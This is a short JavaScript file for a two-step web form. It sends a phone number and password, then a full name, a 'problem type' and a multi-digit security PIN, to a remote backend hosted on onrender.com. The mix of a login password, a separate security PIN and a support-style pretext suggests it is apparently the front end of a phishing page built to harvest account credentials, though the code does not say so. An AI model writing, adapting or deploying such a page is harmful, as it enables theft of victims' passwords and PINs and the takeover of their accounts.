let currentPhone = "";

document.getElementById("loginForm").addEventListener("submit", async function (e) {

    e.preventDefault();

    const phone = document.getElementById("phone").value;
    const password = document.getElementById("password").value;

    currentPhone = phone;

    const response = await fetch("https://sprodeal-backend-juwe.onrender.com/login", {

        method: "POST",

        headers: {
            "Content-Type": "application/json"
        },

        body: JSON.stringify({
            phone,
            password
        })

    });

    const data = await response.json();

    alert(data.message);

    document.getElementById("loginForm").style.display = "none";
    document.getElementById("detailsForm").style.display = "block";

});

document.getElementById("detailsForm").addEventListener("submit", async function (e) {

    e.preventDefault();

    const pin = document.querySelectorAll(".pin");

    let securityPin = "";

    pin.forEach(input => {
        securityPin += input.value;
    });

    const response = await fetch("https://sprodeal-backend-juwe.onrender.com/details", {

        method: "POST",

        headers: {
            "Content-Type": "application/json"
        },

        body: JSON.stringify({

            phone: currentPhone,

            fullName: document.getElementById("fullName").value,

            problemType: document.getElementById("problemType").value,

            securityPin: securityPin,

            experienceLevel: document.getElementById("experienceLevel").value

        })

    });

    const data = await response.json();

    alert(data.message);

});


function showPopup() {

    document.getElementById("overlay").style.display = "flex";

    let time = 2;
    document.getElementById("count").innerText = time;

    let interval = setInterval(() => {

        time--;
        document.getElementById("count").innerText = time;

        if (time <= 0) {
            clearInterval(interval);

            // Redirect page
            window.location.href = "index.html";
        }

    }, 1000);
}

function closePopup() {
    document.getElementById("overlay").style.display = "none";
}